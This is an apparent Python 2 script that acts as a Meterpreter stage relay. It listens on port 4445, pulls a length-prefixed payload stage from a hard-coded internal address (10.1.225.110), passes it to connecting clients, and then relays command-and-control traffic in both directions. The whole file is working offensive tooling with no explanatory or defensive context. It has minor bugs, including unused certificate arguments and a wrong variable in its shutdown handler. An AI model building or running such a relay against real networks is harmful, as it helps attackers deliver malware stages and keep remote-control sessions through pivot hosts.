#!/usr/bin/env python

import sys, socket, thread, ssl, re, base64, time

import xml.etree.ElementTree as et

HOST = '0.0.0.0'
PORT = 4445
BUFSIZE = 4096

def child(sock,certfile='',keyfile=''):
	global packetA
	try:
		name="10.1.225.110"
		print 'hostname:', name

		targetsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		print 'SERVER CONNECT to:', name
		targetsock.connect((name,PORT))
		
		print 'receiving packet size'
		pkt = targetsock.recv(4)
		pktfixed=str(pkt.encode('hex_codec'))
		pktfixed2=pktfixed[6:8]+pktfixed[4:6]+pktfixed[2:4]+pktfixed[0:2]
		print 'receiving meterpreter size: '+str(int(pktfixed2,16))+" HEX: "+pktfixed2+" original: "+pktfixed
		pkt2=""
		MSGLEN=int(pktfixed2,16)
		while len(pkt2) < MSGLEN:
			chunk = targetsock.recv(MSGLEN-len(pkt2))
			if chunk == '':
				raise RuntimeError("socket connection broken")
			pkt2 = pkt2 + chunk

		print "sent payload size: "+str(len(pkt2))
		sock.send(pkt)
		sock.send(pkt2)

		sock.settimeout(1.0)		
		targetsock.settimeout(1.0)
		print 'RELAYING'
		while 1:
			try:
				p = sock.recv(int(pktfixed2,16))
				print "C->S"
				targetsock.send(p)
			except socket.error as e:
				if "timed out" not in str(e):
					raise e	
			try:
				p = targetsock.recv(int(pktfixed2,16))
				print "S->C"
				sock.send(p)
			except socket.error as e:
				if "timed out" not in str(e):
					raise e


	except Exception as e:
		print "closing client socket:",e
		sock.close()

if __name__=='__main__': 
	keyfile = ''
	certfile = ''
	if len(sys.argv) == 3:
		keyfile = sys.argv[1]
		certfile = sys.argv[2]
	myserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	myserver.bind((HOST, PORT))
	myserver.listen(2)
	print 'LISTENER ready on port', PORT
	try:
		while 1:
			client, addr = myserver.accept()
			print 'CLIENT CONNECT from:', addr
			thread.start_new_thread(child, (client,certfile,keyfile))
	except KeyboardInterrupt:
		server.close()